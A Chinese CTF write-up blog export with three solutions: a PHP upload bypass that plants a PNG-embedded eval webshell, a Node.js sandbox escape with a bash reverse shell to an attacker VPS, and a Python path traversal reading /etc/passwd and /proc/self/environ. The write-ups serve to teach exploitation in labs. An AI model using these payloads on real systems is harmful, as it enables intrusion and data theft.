        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment"># 由 $file 创建一个新图像</span>
        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">imagecrop</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span> <span class="token operator">=&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'y'</span> <span class="token operator">=&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'width'</span> <span class="token operator">=&gt;</span> <span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'height'</span> <span class="token operator">=&gt;</span> <span class="token variable">$size</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment"># 将图像裁剪到给定的矩形</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$second</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$final_name</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>	<span class="token comment"># 相当于文件名</span>
            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'example/'</span><span class="token operator">.</span><span class="token variable">$final_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要传<code>.zip</code>文件，但是首页源码把<code>i</code>这个字母过滤掉了，我们只能思考首页源码第25行<code>mb_strtolower()</code>函数可否利用。可以利用一些unicode字符绕过。经过测试发现</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'İ'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
#结果为true，并且首页源码第21行还执行了urldecode。所以可以用%c4%b0代替'İ'字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了绕过图片检测，将一句话写入png图片脚本如下（图片隐写技巧）：</p>
<p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a></p>
<p>在[Entropy - CyberChef](<a href="https://gchq.github.io/CyberChef/#recipe=Entropy">https://gchq.github.io/CyberChef/#recipe=Entropy</a>(‘Shannon scale’))进行如下解码操作（中间Raw Deflate是PNG图片IDAT的压缩算法deflate/inflate，参考：<a href="https://vivaxyblog.github.io/2019/12/07/decode-a-png-image-with-javascript-cn.html%EF%BC%89">https://vivaxyblog.github.io/2019/12/07/decode-a-png-image-with-javascript-cn.html）</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918102916094.png"></p>
<p>在十六进制编辑器Winhex里修改payload如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918104745787.png"></p>
<p>修改前后十六进制值对比如下</p>
<pre class="line-numbers language-none"><code class="language-none">5b 3c 3f 3d 24 5f 47 45 54 5b 30 5d 28 24 5f 50 4f 53 54 5b 31 5d 29 3b 3f 3e 58 00 00
5B 3C 3F 3D 45 56 41 4C 28 24 5F 50 4F 53 54 5B 31 5D 29 3B 20 20 20 20 3F 3E 58 00 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后再进行编码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918104417784.png"></p>
<pre class="line-numbers language-none"><code class="language-none">a39f67641d201612546f112e29152b2167226b505050506f5f5310<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改代码如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918104709439.png"></p>
<p>生成带有payload的<code>a.png</code>，然后修改图片后缀为php并压缩成zip</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918110616664.png"></p>
<p>本地phpstudy开启一个web服务，访问如下代码</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>上传页面<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://666a12e6-ffb1-4a49-b7cc-ba6766cecb88.node4.buuoj.cn:81/upload.php?ctf=upload<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--链接是当前打开的题目链接--&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在页面中上传<code>a.zip</code>，然后抓包修改如下两个位置，发送请求包即可看到响应上传成功</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918130927369.png"></p>
<p>然后访问<code>/example.php?ctf=poc</code>，并发送post数据，解压<code>a.zip</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918131639255.png" style="zoom: 80%;">

<p>由example.php文件的第35行代码<code>imagepng($second, 'example/'.$final_name);</code>可知，文件最终路径在<code>/example/a.php</code>，蚁剑访问连接，在<code>/etc</code>子目录下读到flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918132238458.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/jiangdie666/article/details/116997461">https://blog.csdn.net/jiangdie666/article/details/116997461</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件上传bypass</tag>
        <tag>php代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>2021祥云杯-cralwer_z</title>
    <url>/posts/9a2f1a58.html</url>
    <content><![CDATA[<h1 id="2021祥云杯-cralwer-z"><a href="#2021祥云杯-cralwer-z" class="headerlink" title="2021祥云杯-cralwer_z"></a>2021祥云杯-cralwer_z</h1><p>知识点概要：js代码审计</p>
<p>首页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825142515319.png"></p>
<p>随便注册个用户登录进去（笔者此处注册admin），在Profile页面可以更新个人信息</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825143457273.png" style="zoom:67%;">

<p>有源码，源码结构：</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825143612374.png"></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>源码中的<code>findByPK()</code>和<code>findOne()</code>是Sequelize API，效果可以类比数据库查询</p>
<p>具体参考：<a href="https://sequelize.org/docs/v6/core-concepts/model-querying-finders/">https://sequelize.org/docs/v6/core-concepts/model-querying-finders/</a></p>
<p>首先server.js规定了用户路由从<code>/user</code>开始</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825144252403.png"></p>
<p><code>/routes/index.js</code>是常规的首页注册、登录、登出功能</p>
<p><code>/routes/user.js</code>有几个关键路由</p>
<p><code>/user/profile</code>路由，分为三部分</p>
<p>1.要求传入参数affiliation、age、bucket不为空且是字符串，其中<code>checkBucket()</code>要求bucket协议是<code>http:</code>或<code>https:</code>，且url包含<code>oss-cn-beijing.ichunqiu.com</code>字符串（代码在第二张图）；</p>
<p>2.把传入的affiliation、age、bucket参数值更新到数据库（bucket赋值给personalBucket），并生成一个token；</p>
<p>3.正则匹配bucket，若符合正则，则用上一步生成的token跳转访问<code>/user/verify</code>路由，反之则返回提示；</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825144624938.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825151144701.png"></p>
<p><code>/user/verify</code>路由</p>
<p>验证token，验证成功则更新数据库中用户的bucket（personalBucket赋值给bucket）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825151848998.png"></p>
<p><code>/user/bucket</code>路由</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825153629000.png"></p>
<p>这里的正则跟<code>/user/profile</code>的正则是一样的，但是可以看到，此处else有一个对用户bucket的请求，肯定是利用点，要想利用bucket，那就要清楚bucket怎么控制，bucket传递路线如下</p>
<p><code>/user/profile</code>传入bucket参数→数据库赋值给personalBucket→<code>/user/verify</code>再把personalBucket赋值给bucket</p>
<p>相当于在数据库兜了一圈，想请求bucket，就必须经过<code>/user/verify</code>，那么<code>/user/profile</code>的正则就必须匹配成功，那么<code>/user/bucket</code>的正则也会同步匹配成功，那么就没法请求bucket。</p>
<p>所以明确目标：让<code>/user/profile</code>正则匹配成功，同时<code>/user/bucket</code>正则匹配失败，最终的bucket还要是我们自己的URL</p>
<p>此时看<code>/user/profile</code>，可以发现，它的逻辑是先更新bucket，再正则匹配，然后再重定向到<code>/user/verify</code>，</p>
<p>且checkBucket()没有正则那么严格，只检查协议和<code>oss-cn-beijing.ichunqiu.com</code>字符串</p>
<p>那么我们可以发送两次数据包，第一次传正常的bucket，重定向之前，第二次传伪造的bucket，格式如下，然后让第一个请求继续重定向，再访问<code>/user/bucket</code>路由，即可进到else，从而对伪造的bucket发起请求</p>
<pre class="line-numbers language-none"><code class="language-none">http%3A%2F%2Fxx.xx.xx.xx/index.html?oss-cn-beijing.ichunqiu.com%2F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>xx.xx.xx.xx是自己的vps，上述操作之前先在vps建一个index.html，代码如下，然后开启http服务</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
    a=this.constructor.constructor.constructor.constructor('return process')();
    b=a.mainModule.require('child_process');
    c=b.execSync('cat /flag').toString();
    document.write(c);
&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><p>先在vps建一个index.html，然后开启http服务</p>
<p>题目正常注册，登录，然后抓取<code>/user/profile</code>的数据包，发送到Repeater两份，第一份正常发送</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825162525722.png"></p>
<p>第二份修改bucket后发送，响应包也可看到绕过<code>/user/profile</code>正则的提示</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825163018649.png"></p>
<p>然后回到第一份，点击左上角Send那一行的<code>Follow Redirection</code>，成功更新bucket</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825163504396.png"></p>
<p>URL访问<code>/user/bucket</code>，获取flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825163715777.png"></p>
<p>也可反弹shell，若用这个，可用screen命令在vps开两个窗口，一个开启http服务，一个监听反弹shell端口</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
c='constructor';this[c][c]("c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/9898 0&gt;&amp;1'],);console.log(ls.output.toString());")()
&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230825164757525.png"></p>
<p>回头看，问题在于checkBucket()不够严格，只检查协议和<code>oss-cn-beijing.ichunqiu.com</code>字符串</p>
<p>避免漏洞的思路：<code>/user/profile</code>中checkBucket()用正则的逻辑；或者先正则匹配，再更新bucket</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/RABCDXB/article/details/124189883">https://blog.csdn.net/RABCDXB/article/details/124189883</a></p>
<p><a href="https://blog.csdn.net/cjdgg/article/details/120147572">https://blog.csdn.net/cjdgg/article/details/120147572</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>js代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>LineCTF2022-MemoDrive</title>
    <url>/posts/e7bee0fc.html</url>
    <content><![CDATA[<h1 id="LineCTF2022-MemoDrive"><a href="#LineCTF2022-MemoDrive" class="headerlink" title="LineCTF2022-MemoDrive"></a>LineCTF2022-MemoDrive</h1><p>知识点概要：CVE-2021-23336、目录遍历</p>
<p>详情参考：<a href="https://python-security.readthedocs.io/vuln/urllib-query-string-semicolon-separator.html">urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator</a></p>
<p>首页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907180219464.png"></p>
<p>有源码，关键代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    context <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        context<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request
        clientId <span class="token operator">=</span> getClientID<span class="token punctuation">(</span>request<span class="token punctuation">.</span>client<span class="token punctuation">.</span>host<span class="token punctuation">)</span>	<span class="token comment">#getClientID()为题目源码的函数，做了一个hash运算</span>

        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        
        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        contents <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        context<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> filename
        context<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> contents
    
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> templates<span class="token punctuation">.</span>TemplateResponse<span class="token punctuation">(</span><span class="token string">'/view/view.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getClientID</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> ip <span class="token operator">+</span> <span class="token string">'_'</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">'SALT'</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第15行全场唯一读文件方法<code>readlines()</code>，只需让path变量为flag所在路径即可</p>
<p>按照题目源码框架，本地启一个环境测试一下，代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
<span class="token keyword">import</span> uvicorn
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>applications <span class="token keyword">import</span> Starlette
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>routing <span class="token keyword">import</span> Route
<span class="token keyword">from</span> starlette<span class="token punctuation">.</span>responses <span class="token keyword">import</span> JSONResponse

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        clientId <span class="token operator">=</span> <span class="token string">"id"</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.url:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.url.query:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.query_params:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"unquote params:"</span><span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'&amp;'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>url<span class="token punctuation">.</span>query <span class="token keyword">or</span> <span class="token string">'.'</span> <span class="token keyword">in</span> unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span>
        
        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">[</span>clientId<span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"filename:"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"request.query_params.keys:"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string">'./memo/'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_params<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"path:"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>
    
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    
    <span class="token keyword">return</span> JSONResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

routes <span class="token operator">=</span> <span class="token punctuation">[</span>
    Route<span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> endpoint<span class="token operator">=</span>view<span class="token punctuation">)</span>
<span class="token punctuation">]</span>

app <span class="token operator">=</span> Starlette<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> routes<span class="token operator">=</span>routes<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    uvicorn<span class="token punctuation">.</span>run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">11000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>浏览器访问</p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.1.34:11000/view?id=flag;/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907190428803.png"></p>
<p>在部分python版本中，解析URL参数时，会将分号<code>;</code>解析成参数分隔符<code>&amp;</code>，从而导致此题目可被利用</p>
<p>参考：<a href="https://python-security.readthedocs.io/vuln/urllib-query-string-semicolon-separator.html">urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator</a></p>
<p>实际操作如下</p>
<p>先在首页上侧的文本框随便输入，点击<code>SAVE</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192147352.png"></p>
<p>然后下侧文本框会显示一串数字，就是序号+时间戳生成的文件名，点击进去</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192348805.png"></p>
<p>可看到URL跳转到<code>/view?5e9995136241f179475b3f35dab141a4=0_20230907112045</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192527752.png"></p>
<p>修改为如下，假flag（必须先走完上面的步骤，直接访问此路径无回显）</p>
<pre class="line-numbers language-none"><code class="language-none">/view?5e9995136241f179475b3f35dab141a4=flag;/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192658648.png"></p>
<p>等号后修改为如下，读<code>/etc/passwd</code></p>
<pre class="line-numbers language-none"><code class="language-none">etc/passwd;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907192822627.png"></p>
<p>源码<code>getClientID()</code>函数里有读取环境变量的代码<code>os.getenv('SALT')</code>，那么可以尝试读当前进程的环境变量信息<code>/proc/self/environ</code>，等号后修改为如下</p>
<pre class="line-numbers language-none"><code class="language-none">proc/self/environ;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907194359645.png"></p>
<p>已经可以看到<code>SALT</code>环境变量，但提示flag不在此</p>
<p>读进程 ID 为 1 的进程环境变量<code>/proc/1/environ</code>，等号后修改为如下</p>
